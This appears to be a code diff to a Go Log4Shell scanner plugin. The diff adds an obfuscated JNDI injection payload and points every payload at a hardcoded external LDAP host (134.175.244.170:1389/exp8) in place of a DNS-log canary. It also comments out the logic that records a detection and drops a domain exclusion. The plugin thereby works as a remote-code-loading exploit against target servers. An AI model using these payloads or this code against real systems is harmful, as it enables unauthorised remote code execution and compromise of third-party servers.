@@ -7,7 +7,6 @@ import (
 	util "github.com/deenrookie/kunpeng-plus/utils"
 	"net/http"
 	"strings"
-	"time"
 )
 
 type log4jRCE struct {
@@ -42,10 +41,6 @@ func (d *log4jRCE) GetResult() []plugin.Plugin {
 }
 
 func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
-	if strings.Contains(URL, ".o.tencent.com") {
-		return false
-	}
-
 	domain := util.GetHostFromUrl(URL)
 
 	if domain == "" {
@@ -56,15 +51,16 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 	randString := utils.RandStringRunes(6)
 	// count := 0
 	randStr := domain + ".${:-" + randString + "}"
-	trueWord := domain + "." + randString
+	// trueWord := domain + "." + randString
 	// randStr = "nowqq" + utils.RandStringRunes(6)
-	fmt.Println(randStr)
+	fmt.Println(domain)
 	payloads := []string{
 		//"${j${::-}n${::-}d${::-}i:l${::-}d${::-}a${::-}p://",
 		//"${jndi:lda${:-}p://",
 		//"${j${aaa::::-n}di:ldap://",
 		//"${j${aaa::::-n}d${:-}i:ldap://",
 		//"${j${aaa::::-n}d${:-}i:ldap://",
+		"${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:ı}:}}}ldap://",
 		"${j${:-}n${:-}d${:-}i:l${:-}d${:-}a${:-p:}//",
 		"${jn${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${:-}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}d}}}}}}}}i}}}}:ldap://",
 	}
@@ -104,7 +100,7 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 	for _, payload := range payloads {
 		// fullPayload := payload
 		fullPayload := fmt.Sprintf("%s%s.%s/}?a", payload, randStr, utils.DNS_LOG_DOMAIN)
-		// fullPayload := fmt.Sprintf("%s134.175.244.170:1389/i0rhku}", payload)
+		fullPayload = fmt.Sprintf("%s134.175.244.170:1389/exp8/%s}", payload, domain)
 		for _, reqPath := range reqPaths {
 			for _, method := range methods {
 				var request *http.Request
@@ -206,26 +202,26 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 				}
 				// fmt.Println(count)
 				// count++
-				if utils.IsExistDNSLog(trueWord) {
-					result := d.info
-					result.Response = "TEST"
-					result.Request = "TEST"
-					d.result = append(d.result, result)
-					return true
-				}
+				//if utils.IsExistDNSLog(trueWord) {
+				//	result := d.info
+				//	result.Response = "TEST"
+				//	result.Request = "TEST"
+				//	d.result = append(d.result, result)
+				//	return true
+				//}
 			}
 		}
 
 	}
 
-	time.Sleep(time.Duration(15) * time.Second)
-
-	if utils.IsExistDNSLog(trueWord) {
-		result := d.info
-		result.Response = "TEST"
-		result.Request = "TEST"
-		d.result = append(d.result, result)
-		return true
-	}
+	//time.Sleep(time.Duration(5) * time.Second)
+	//
+	//if utils.IsExistDNSLog(trueWord) {
+	//	result := d.info
+	//	result.Response = "TEST"
+	//	result.Request = "TEST"
+	//	d.result = append(d.result, result)
+	//	return true
+	//}
 	return false
 }
